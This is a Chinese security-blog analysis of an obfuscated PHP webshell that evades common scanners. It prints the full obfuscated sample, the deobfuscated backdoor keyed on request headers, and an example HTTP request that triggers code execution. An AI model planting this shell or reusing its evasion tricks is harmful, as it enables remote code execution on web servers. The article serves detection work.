# 一类混淆变形的Webshell分析

阅读量 **255459**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-02-26 16:30:36

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0144362bdf5913fddb.jpg)

> 本篇原创文章参加双倍稿费活动，预估稿费为800元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)

## Webshell简介

Webshell起初是作为管理员进行服务器远程管理的一类脚本的简称。现在Webshell更多的指Web入侵的工具脚本。Webshell不同于漏洞，而是利用应用漏洞或者服务器漏洞后上传到服务器进行后续利用，属于渗透测试的post-exploitation（后续利用阶段）。Webshell文件大小与功能千差万别，从最简单的一句话类命令执行Webshell到提供各种复杂操作（如端口扫描、数据库操作、内网渗透）的大马。

而为了能够及时地发现这些Webshell，出现很多能够识别出Webshell功能的工具，包括D盾，安全狗等各种安全防护软件。这些防护软件的思路也很简单，通过内置一些常见的Webshell的规则特征，然后对文件进行扫描，如果符合规则，则认为是Webshell。攻击者们为了绕过这些防护软件的检测，都会变换自己的Webshell写法，在保证功能的前提下确保自己的Webshell不会被查杀，其中尤以PHP的写法为多。因为PHP是脚本语言，而且能够利用的函数也很多，再加上PHP语言的特性也是十分的多，导致一个Webshell可以进行千变万化.[PHP
WebShell变形技术总结](http://www.freebuf.com/articles/web/155891.html)这篇文章就总结了常见的php类的Webshell变形技术。繁多的写法也为安全防护软件的识别提出了挑战。

本篇文章就是我之前做有关Webshell相关的工作时发现一类Webshell，此类Webshell无法被目前的安全防护软件识别，我因此对其进行了分析。本篇文章就是对此类Webshell的分析，最后对混淆的Webshell如何进行分析的一些思考，也希望大家提出一些更好的方法。

## 前言

之前分析Webshell时，发现一类Webshell完全可以逃过各种检测软件包括D盾、安全狗等，D盾甚至不会对这类的Webshell进行任何的警告。但是如果我们从代码层面上看完全是无意义的字符串，甚至都不能说是代码。但是如果我们抽丝破茧一步步地分析可以发现的确是Webshell。后来通过大量的样本收集工作，我发现这类的Webshell混淆方式不仅相似，连最后还原出来的Webshell的格式也是十分的雷同。而本文就是对这类Webshell的分析，也希望能够其他抛砖引玉的作用，大佬们也能够提供自己的思路。

## 分析

Webshell的代码如下：

    
    
    <?php
    $XR='r0nw'&~Y0dTO1Wt;$ZAps4M='+l-'&')fw';$AKsSa=FAPZB." "|HDAHH.'!';$j5gQLS=#XTQGk'.
       'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';$PqU=#li5cBcb42vVsRV4pLBKntygCNiV5lHCR'.
       'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'./*lCU5'.
        'UP@0M*/TPc0PK;$FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'./*n'.
        'fLL*/wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';$rG4r3bseFJ='*n}Pqf-n#g'^#a_lCdbiaBRR'.
       'm81-2Eu0~C';$rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;$L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'.
        '-.A';$yc='@@b @"!'|'BBp)@`)';$mdKTVt=EcP791|UAFQ."<u";$Ulin='4z#j1!K'^#IMQIwU'.
       'c>Q pir';$wVYqzGy5='u%!k*{il`'^'=qu;u#690';$BywtZ8QaHFk=_KELlmn&'_Wa~M[_';'BU'.
        'iGh o|';$YzuZ=n^')';$PpCD4RJ914D="+|*%"^t0ck;$IIBxK1GA_=']_'&g_;$StoL=M&i;'Jb'.
        'K8f-._$Js';$IXedwT=T&D;$ZVe4pZrS1=$ZAps4M|('^di'^';D]');$atE4muYNLph=(#Dfao7h'.
       '  $;$G'|') %$$U')^$AKsSa;$vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^#Ereo6cpaZFW9p3w'.
       '&$YX8<&C1E$4 W5');$Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');$HLOTWYy3Ip6=/*'.
        '2c@lB!:Kru*/$PqU^$FtaeUxv;$bAXD1h2s=$rG4r3bseFJ^$rB;$O0Xnet=("9{".SIkzl&#gIg3'.
       '=~'.KQnZo)^$L_X96rF;$ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');if(/*'.
        'Tf0tz*/$ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,/*'.
        'HNy*/$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_./*wQit'.
        'NLNa~*/$StoL.$IXedwT));$bIywY($O0Xnet,$ro74Wy,$OIYd);#k;xvCWvgqQ!L>?10w:u&{E'.
       '@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';
    ?>
    

初看之下，没有任何Webshell的痕迹。

###  去除注释

由于代码中混杂了部分无意义的注释，如第1行中的`#XTQGk'.`。所以我们首先是去除注释，得到:

    
    
    <?php
    $XR='r0nw'&~Y0dTO1Wt;$ZAps4M='+l-'&')fw';$AKsSa=FAPZB." "|HDAHH.'!';$j5gQLS=
        'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';$PqU=
        'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'.TPc0PK;$FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'.wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';$rG4r3bseFJ='*n}Pqf-n#g'^
        'm81-2Eu0~C';$rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;$L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'.
    '-.A';$yc='@@b @"!'|'BBp)@`)';$mdKTVt=EcP791|UAFQ."<u";$Ulin='4z#j1!K'^
        'c>Q pir';$wVYqzGy5='u%!k*{il`'^'=qu;u#690';$BywtZ8QaHFk=_KELlmn&'_Wa~M[_';'BU'.
    'iGh o|';$YzuZ=n^')';$PpCD4RJ914D="+|*%"^t0ck;$IIBxK1GA_=']_'&g_;$StoL=M&i;'Jb'.
    'K8f-._$Js';$IXedwT=T&D;$ZVe4pZrS1=$ZAps4M|('^di'^';D]');$atE4muYNLph=(
            '  $;$G'|') %$$U')^$AKsSa;$vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^
            '&$YX8<&C1E$4 W5');$Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');$HLOTWYy3Ip6=$PqU^$FtaeUxv;$bAXD1h2s=$rG4r3bseFJ^$rB;$O0Xnet=("9{".SIkzl&
            '=~'.KQnZo)^$L_X96rF;$ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));$bIywY($O0Xnet,$ro74Wy,$OIYd);
    '@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';
    ?>
    

###  代码格式化

为了便于分析，对代码按照`;`重新对代码进行编排，得到如下所示的代码：

    
    
    $XR='r0nw'&~Y0dTO1Wt;
    $ZAps4M='+l-'&')fw';
    $AKsSa=FAPZB." "|HDAHH.'!';
    $j5gQLS= 'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';
    $PqU= 'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'.TPc0PK;
    $FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'.wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';
    $rG4r3bseFJ='*n}Pqf-n#g'^ 'm81-2Eu0~C';
    $rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;
    $L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'. '-.A';
    $yc='@@b @"!'|'BBp)@`)';
    $mdKTVt=EcP791|UAFQ."<u";
    $Ulin='4z#j1!K'^ 'c>Q pir';
    $wVYqzGy5='u%!k*{il`'^'=qu;u#690';
    $BywtZ8QaHFk=_KELlmn&'_Wa~M[_';
    'BU'. 'iGh o|';
    $YzuZ=n^')';
    $PpCD4RJ914D="+|*%"^t0ck;
    $IIBxK1GA_=']_'&g_;
    $StoL=M&i;
    'Jb'. 'K8f-._$Js';
    $IXedwT=T&D;
    $ZVe4pZrS1=$ZAps4M|('^di'^';D]');
    $atE4muYNLph=('  $;$G'|') %$$U')^$AKsSa;
    $vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^ '&$YX8<&C1E$4 W5');
    $Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');
    $HLOTWYy3Ip6=$PqU^$FtaeUxv;
    $bAXD1h2s=$rG4r3bseFJ^$rB;
    $O0Xnet=("9{".SIkzl& '=~'.KQnZo)^$L_X96rF;
    $ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');
    if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    $bIywY($O0Xnet,$ro74Wy,$OIYd);
    '@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';
    

分析代码发现，大部分的代码都是通过字符串的`|`、`^`、`.`操作赋值，只有最后两行代码：

    
    
    if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    $bIywY($O0Xnet,$ro74Wy,$OIYd);
    

是关键性的代码，而其中的变量都是通过前面的初始化或者是运算得到的。那么我们就可以注释最后两行代码，输出其中所有的变量。结果如下：  

带入到最后的两行代码中，得到:

    
    
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') $bIywY=create_function('$a,$b,$c',getenv('HTTP_X_UP_CALLING_LINE_ID'));
    $bIywY('x1o6Vm2','WFrkAj9','WFrkAj9');
    

## Webshell分析

    
    
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') $bIywY=create_function('$a,$b,$c',getenv('HTTP_X_UP_CALLING_LINE_ID'));
    $bIywY('x1o6Vm2','WFrkAj9','WFrkAj9');
    

这个代码就是很明显的Webshell代码了，整个代码主要是利用了PHP的以下特性：

  1. 所有的通过`getenv`获取`HTTP`开头的变量都是可以通过请求头设置的，即用户/攻击者是可以控制的。
  2. `create_function`能够执行代码，如`$func = create_function('$a,$b','eval("phpinfo();");');$func();`

在本题中我们利用以上的特性就可以进行代码执行了。由于其中的`5d15db53a91790e913dc4e05a1319c42`无法解出来，为了便于演示，换成`e10adc3949ba59abbe56e057f20f883e`(123456的md5)。  
那么我们最终发送的payload为：

    
    
    GET /test/tmp.php HTTP/1.1
    Host: localhost
    A: 123456
    X-Up-Calling-Line-Id: assert("phpinfo();");
    

其中请求头`A`就是密码，而`X-Up-Calling-Line-Id`就是需要执行的命令，当然我们还可以将其改造为`assert($_POST[cmd]);`。

## 总结

其实本题目中最重要的两步就是去掉注释以及代码的重新编排，这个对于分析混淆的php代码是非常有帮助的。尤其是要注意到最后两行代码是需要进行注释的，否则直接运行由于无法通过`md5`的校验导致程序无法执行。

###  get_defined_vars

除了上述所讲到的通过`var_dump(变量名)`这种方式输出变量，还有很多其他的方法。如通过`get_defined_vars()`输出。我们通过在所有的变量下方加入：

    
    
    <?php
    $XR='r0nw'&~Y0dTO1Wt;
    $ZAps4M='+l-'&')fw';
    //..... php code
    $vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^ '&$YX8<&C1E$4 W5');
    $Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');
    $HLOTWYy3Ip6=$PqU^$FtaeUxv;
    $bAXD1h2s=$rG4r3bseFJ^$rB;
    $O0Xnet=("9{".SIkzl&'=~'.KQnZo)^$L_X96rF;
    $ro74Wy=$yc|$Ulin;
    $OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');
    var_dump(get_defined_vars());
    //if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    //$bIywY($O0Xnet,$ro74Wy,$OIYd);
    

这样同样可以得到所有的变量

![](https://p1.ssl.qhimg.com/t01cedf89515d90b5bb.png)

###  动态调试

这个方式是我比较推崇的，因为比较直接使用。通过一步一步跟踪代码更容易看清实质  
  

不仅可以通过`Variables`查看所有的变量还可以通过`Evaluate`进行php代码编写得到中间变量。通过这两者的配合基本上就可以得到所有的变量信息了。

## 后文

通过分析，发现存在大量这种类似的Webshell代码，如下：

![](https://p5.ssl.qhimg.com/t011023c62cf7ee84fa.png)

这些代码的结构同时相似的：最后生成的代码都是形如:

    
    
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') call_user_func('preg_replace','/[pS]/emix',getenv('HTTP_X_DEVICE_ACCEPT_CHARSET'),'eC11cC1kZXZjYXAtbXNpemU=');
    

那么猜测应该是有程序能够按照一定的规则生成这种加密的Webshell代码。这些Webshell的密码都是相同的，表明这些Webshell可能是出自同一人之手。

我们也有理由猜测，这个幕后的Webshell的作者可能是编写了一套规则，用以对原始的Webshell进行混淆变形从而绕过防护软件。从这个角度来看的话，如果有其他的攻击者也能够自行设计一套混淆加密的规则，那么是否也能够绕过防护软件呢？

说完了绕过，最后说明一下我对Webshell检测的看法。由于语言的特性，导致Webshell的变形层出不穷，如果仅仅只是收集已有的Webshell的规则，或者是通过文本字符串上面去对抗，是无法保证准确率的，变形的套路总是会多到精疲力竭，一种绕过姿势又可以衍生出出无限多的样本，所以如果想能够有效地检测出未知的Webshell，那么就需要借助于机器学习的方法来进行识别了。如何利用机器学习来识别出Webshell，那么这又是一篇很大的文章了。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **天王盖地虎** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/98889](/post/id/98889)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [PHP](/tag/PHP)
  * [Webshell变形](/tag/Webshell变形)

 **+1** __2赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) 天王盖地虎

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

